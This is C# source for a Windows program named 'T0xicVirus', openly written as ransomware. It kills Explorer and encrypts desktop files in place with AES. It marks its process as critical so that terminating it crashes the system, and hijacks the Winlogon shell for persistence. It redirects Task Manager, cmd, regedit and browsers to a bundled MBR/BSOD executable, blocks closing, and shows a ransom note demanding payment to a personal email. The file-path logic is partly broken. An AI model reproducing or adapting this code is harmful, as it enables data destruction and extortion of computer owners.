using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Diagnostics;
using System.Linq;
using System.Text;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Media;
using System.Security.Cryptography;
using System.Runtime.InteropServices;
using aLib.Microsoft;
using System.Reflection;
using Microsoft.Win32;



namespace T0xicVirus
{
    public partial class ToxicVirus : Form
    {
        SoundPlayer T0xic = new SoundPlayer();

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);

        private bool DISABLE_ALT_F4 = false;



    public static void Extract(string nameSpace, string outDirectory, string internalFilePath, string resourceName)
        {
            //DON'T TOUCH THIS CODE!!!

            Assembly assembly = Assembly.GetCallingAssembly();

            using (Stream s = assembly.GetManifestResourceStream(nameSpace + "." + (internalFilePath == "" ? "" : internalFilePath + ".") + resourceName))
            using (BinaryReader r = new BinaryReader(s))
            using (FileStream fs = new FileStream(outDirectory + "\\" + resourceName, FileMode.OpenOrCreate))
            using (BinaryWriter w = new BinaryWriter(fs))
                w.Write(r.ReadBytes((int)s.Length));
        }

        public ToxicVirus()
        {
            InitializeComponent();
            if(!Directory.Exists(@"C:\ToxicVirus"))
            {
                //kill explorer.exe for better work this virus 
                ProcessStartInfo explorer = new ProcessStartInfo();
                explorer.FileName = "cmd.exe";
                explorer.Arguments = @"taskkill /f /im explorer.exe";
                explorer.WindowStyle = ProcessWindowStyle.Hidden;
                Process.Start(explorer);
                //Extract your Resources files to Directory 
                Extract("T0xicVirus", @"C:\ToxicVirus", "Resources", "T0xicVirusMBRandBSOD.exe");
                Extract("T0xicVirus", @"C:\ToxicVirus", "Resources", "T0xicVirus.wav");
                T0xic = new SoundPlayer(@"C:\ToxicVirus\T0xicVirus.wav");
                T0xic.PlayLooping();
                //Hide ToxicVirus Directory
                DirectoryInfo tempfile = new DirectoryInfo(@"C:\ToxicVirus");
                tempfile.Attributes = FileAttributes.Hidden;
            }
            //Encrypt This Files on DESKTOP :D
            BeginEncryptT0xicVirus();
            int isCritical = 1;  
            int BreakOnTermination = 0x1D;  
            Process.EnterDebugMode();  
            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int)); //BSOD TIME!!! :D
            RegistryKey keywinlogon = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
            keywinlogon.DeleteValue("Shell");
            keywinlogon.SetValue("Shell", @"explorer.exe, C:\ToxicVirus\T0xicVirus.exe", RegistryValueKind.String);
            RegistryKey RewriteTaskMGR = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe");
            RewriteTaskMGR.SetValue("Debugger", @"C:\ToxicVirus\T0xicVirusMBRandBSOD.exe");
            RegistryKey RewriteInternetExplorer = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe");
            RegistryKey RewriteRegEDIT = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe");
            RegistryKey RewriteMSEDGE = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe");
            RewriteInternetExplorer.SetValue("Debugger", @"C:\ToxicVirus\T0xicVirusMBRandBSOD.exe");
            RewriteRegEDIT.SetValue("Debugger", @"C:\ToxicVirus\T0xicVirusMBRandBSOD.exe");
            RewriteMSEDGE.SetValue("Debugger", @"C:\ToxicVirus\T0xicVirusMBRandBSOD.exe");
            RegistryKey CMDOverwrite = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe");
            CMDOverwrite.SetValue("Debugger", @"C:\ToxicVirus\T0xicVirusMBRandBSOD.exe");
        }


        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true; //Anti-Kill :D

            if(DISABLE_ALT_F4)
            {
                e.Cancel = true;
            }
            if (e.CloseReason == CloseReason.UserClosing)
            {
                e.Cancel = true;
            }
            if (e.CloseReason == CloseReason.TaskManagerClosing) { e.Cancel = true; }
            if (e.CloseReason == CloseReason.FormOwnerClosing) { e.Cancel = true; }
            if (e.CloseReason == CloseReason.MdiFormClosing) { e.Cancel = true; }
            if(e.CloseReason == CloseReason.WindowsShutDown) { e.Cancel = true; }
        }

        private void Form1_KeyDown(object sender, KeyEventArgs e)
        {
            DISABLE_ALT_F4 = (e.KeyCode.Equals(Keys.F4) && e.Alt == true);
        }
        static void BeginEncryptT0xicVirus()
        {
            //Encrypt Desktop Files from T0xic Virus :D
            string[] files = Directory.GetFiles(Environment.SpecialFolder.Desktop + @"\*.exe" + @"\*.pdf" + @"\*.mp3" + @"\*.mp4", "*", SearchOption.AllDirectories);

            EncryptionFile enc = new EncryptionFile();
            string password = mm_Encryptions.Base64.ToString("t0xicv1rus95382102");

            for (int i = 0; i < files.Length; i++)
            {
                enc.EncryptFile(files[i], password);
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string txthap = @"C:\ToxicVirus\WhatsHappened.txt";
           File.WriteAllText(txthap, "Your files has encrypted by T0xic Virus." + Environment.NewLine + "Please Pay 20 USD in my Ko-Fi Account or DonationAlerts Account to Decrypt Files and Send me Receipt to my email: damagemangaming@gmail.com" + Environment.NewLine + "GOOD LUCK!!!!");
           File.OpenText(txthap);
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if(textBox1.Text == "")
            {
                MessageBox.Show("Wrong Key", "T0xic Virus", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            else if(textBox1.Text == mm_Encryptions.UTF8.ToString("t0xicvirus75392zzork144"))
            {
                MessageBox.Show("Key is Correct, Your PC is saved from T0xic Virus", "T0xic Virus", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
                RegistryKey keywinlogon1 = Registry.LocalMachine.OpenSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon");
                RegistryKey RewriteTaskMGR1 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe");
                RegistryKey RewriteInternetExplorer1 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe");
                RegistryKey RewriteRegEDIT1 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe");
                RegistryKey RewriteMSEDGE1 = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe");
                RegistryKey CMDOverwrite = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe");
                string key1 = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\taskmgr.exe";
                string key2 = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\iexplore.exe";
                string key3 = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\regedit.exe";
                string key4 = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\msedge.exe";
                string cmd = @"SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\cmd.exe";
                keywinlogon1.DeleteValue("Shell");
                keywinlogon1.SetValue("Shell", "explorer.exe");
                RewriteTaskMGR1.DeleteSubKey(key1);
                RewriteInternetExplorer1.DeleteSubKey(key2);
                RewriteRegEDIT1.DeleteSubKey(key3);
                RewriteMSEDGE1.DeleteSubKey(key4);
                CMDOverwrite.DeleteSubKey(cmd);
                Environment.Exit(38);

            }
            else
            {
                MessageBox.Show("Wrong Key", "T0xic Virus", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {
            //Please Read Rules!!!
            File.WriteAllText(@"C:\ToxicVirus\Rules.txt", "1. Don't Launch Any Program(except Google Chrome), otherwise Blue Screen of Death and your PC will DIE" + Environment.NewLine + "2. Don't Restart PC or Shutdown PC!!!" + Environment.NewLine + "3. Don't Run CMD!!!" + Environment.NewLine + "" + Environment.NewLine + "Good Luck");
            File.OpenText(@"C:\ToxicVirus\Rules.txt");
        }

        private void button4_Click(object sender, EventArgs e)
        {
            var NewForm = new PayForm();
            NewForm.Show();
        }
    }
}
internal class T0xicVirusEncryption
{
    public static byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
    {
        byte[] encryptedBytes = null;

        // Set your salt here, change it to meet your flavor:
        // The salt bytes must be at least 8 bytes.
        byte[] saltBytes = new byte[] { 1, 2, 3, 4, 5, 6, 7, 8 };

        using (MemoryStream ms = new MemoryStream())
        {
            using (RijndaelManaged AES = new RijndaelManaged())
            {
                AES.KeySize = 256;
                AES.BlockSize = 128;

                var key = new Rfc2898DeriveBytes(passwordBytes, saltBytes, 5800300);
                AES.Key = key.GetBytes(AES.KeySize / 8);
                AES.IV = key.GetBytes(AES.BlockSize / 8);

                AES.Mode = CipherMode.CFB;

                using (var cs = new CryptoStream(ms, AES.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    cs.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
                    cs.Close();
                }
                encryptedBytes = ms.ToArray();
            }
        }

        return encryptedBytes;
    }
}
public class EncryptionFile
{
    public void EncryptFile(string file, string password)
    {

        byte[] bytesToBeEncrypted = File.ReadAllBytes(file);
        byte[] passwordBytes = Encoding.UTF8.GetBytes(password);

        // Hash the password with SHA256
        passwordBytes = SHA256.Create().ComputeHash(passwordBytes);

        byte[] bytesEncrypted = T0xicVirusEncryption.AES_Encrypt(bytesToBeEncrypted, passwordBytes);

        string fileEncrypted = file;

        File.WriteAllBytes(fileEncrypted, bytesEncrypted);
    }
}
